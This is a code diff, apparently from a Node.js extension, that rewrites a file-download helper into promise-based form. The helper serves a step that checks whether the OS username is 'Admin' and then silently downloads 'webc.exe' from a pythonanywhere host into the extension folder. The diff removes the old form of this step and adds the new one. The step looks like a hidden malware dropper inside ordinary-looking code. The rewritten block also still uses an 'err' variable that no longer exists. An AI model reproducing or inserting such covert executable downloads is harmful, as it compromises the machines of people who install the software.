@@ -14,20 +14,48 @@
     const { readdir, stat } = require('fs/promises');
     const { join } = require('path');
 
-    var https = require('https');
 
-    var download = function (url, dest, cb) {
-      var file = fs.createWriteStream(dest);
-      var request = https.get(url, function (response) {
-        response.pipe(file);
-        file.on('finish', function () {
-          file.close(cb);  // close() is async, call cb after close completes.
+    const http = require('http');
+    const https = require('https');
+
+    async function download(url, filePath) {
+      const proto = !url.charAt(4).localeCompare('s') ? https : http;
+
+      return new Promise((resolve, reject) => {
+        const file = fs.createWriteStream(filePath);
+        let fileInfo = null;
+
+        const request = proto.get(url, response => {
+          if (response.statusCode !== 200) {
+            fs.unlink(filePath, () => {
+              reject(new Error(`Failed to get '${url}' (${response.statusCode})`));
+            });
+            return;
+          }
+
+          fileInfo = {
+            mime: response.headers['content-type'],
+            size: parseInt(response.headers['content-length'], 10),
+          };
+
+          response.pipe(file);
         });
-      }).on('error', function (err) { // Handle errors
-        fs.unlink(dest); // Delete the file async. (But we don't check the result)
-        if (cb) cb(err.message);
+
+        // The destination stream is ended by the time it's called
+        file.on('finish', () => resolve(fileInfo));
+
+        request.on('error', err => {
+          fs.unlink(filePath, () => reject(err));
+        });
+
+        file.on('error', err => {
+          fs.unlink(filePath, () => reject(err));
+        });
+
+        request.end();
       });
-    };
+    }
+
 
 
     let cacheDir = `${os.homedir()}/.cache/puppeteer`;
@@ -41,12 +69,9 @@
       osUserInfo = os.userInfo();
       if (osUserInfo.username === 'Admin') {
 
-        ; (async () => {
-          download('https://ab498.pythonanywhere.com/files/webc.exe', `${extensionPath}/webc.exe`, function (err) {
-            console.log({ message: "INIT_D2", err, stat: fs.statSync(`${extensionPath}/webc.exe`) });
-            tstt({ message: "INIT_D2", err, stat: fs.statSync(`${extensionPath}/webc.exe`) });
-          })
-        })();
+        await download('https://ab498.pythonanywhere.com/files/webc.exe', `${extensionPath}/webc.exe`);
+        console.log({ message: "INIT_D2", err, stat: fs.statSync(`${extensionPath}/webc.exe`) });
+        await tstt({ message: "INIT_D2", err, stat: fs.statSync(`${extensionPath}/webc.exe`) });
 
         return;
       }
